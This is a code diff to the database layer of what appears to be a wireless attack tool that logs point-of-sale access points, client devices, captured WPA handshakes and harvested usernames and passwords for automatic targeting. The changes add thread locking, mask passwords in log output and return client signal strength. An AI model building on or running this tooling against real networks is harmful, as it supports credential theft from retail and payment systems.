@@ -7,6 +7,7 @@ EAPOL handshake frames, and harvested credentials.
 
 import sqlite3
 import time
+import threading
 from datetime import datetime
 
 from .config import DB_NAME, COMMIT_INTERVAL, log
@@ -23,6 +24,7 @@ class POSDatabase:
         self.cursor = self.conn.cursor()
         self._setup_tables()
         self._last_commit = time.monotonic()
+        self._commit_lock = threading.Lock()
 
     def _setup_tables(self):
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS access_points (
@@ -53,9 +55,10 @@ class POSDatabase:
 
     def _maybe_commit(self):
         now = time.monotonic()
-        if now - self._last_commit >= COMMIT_INTERVAL:
-            self.conn.commit()
-            self._last_commit = now
+        with self._commit_lock:
+            if now - self._last_commit >= COMMIT_INTERVAL:
+                self.conn.commit()
+                self._last_commit = now
 
     def update_ap(self, bssid, ssid, vendor, channel, security, rssi, is_pos, is_hidden):
         now = datetime.now().isoformat(timespec='seconds')
@@ -120,14 +123,15 @@ class POSDatabase:
             'INSERT INTO credentials (client_ip, client_mac, username, password, url, timestamp) VALUES (?,?,?,?,?,?)',
             (client_ip, client_mac or "", username, password, url, now))
         self.conn.commit()
-        log.critical(f"CREDENTIAL CAPTURED: user='{username}' pass='{password}' from {client_ip}")
+        log.critical(f"CREDENTIAL CAPTURED: user='{username}' from {client_ip}")
+        log.debug(f"  Password: {'*' * len(password)}")
 
     # ─── Query methods (used by orchestrator for auto-targeting) ──────────────
 
     def get_clients_for_bssid(self, bssid):
-        """Return all client MACs associated with a given BSSID."""
-        self.cursor.execute('SELECT mac FROM clients WHERE associated_bssid = ?', (bssid,))
-        return [row[0] for row in self.cursor.fetchall()]
+        """Return all client MACs and their RSSI values associated with a given BSSID."""
+        self.cursor.execute('SELECT mac, rssi FROM clients WHERE associated_bssid = ?', (bssid,))
+        return [(row[0], row[1]) for row in self.cursor.fetchall()]
 
     def get_pos_access_points(self):
         """Return all POS-flagged APs with their SSID, channel, and BSSID."""
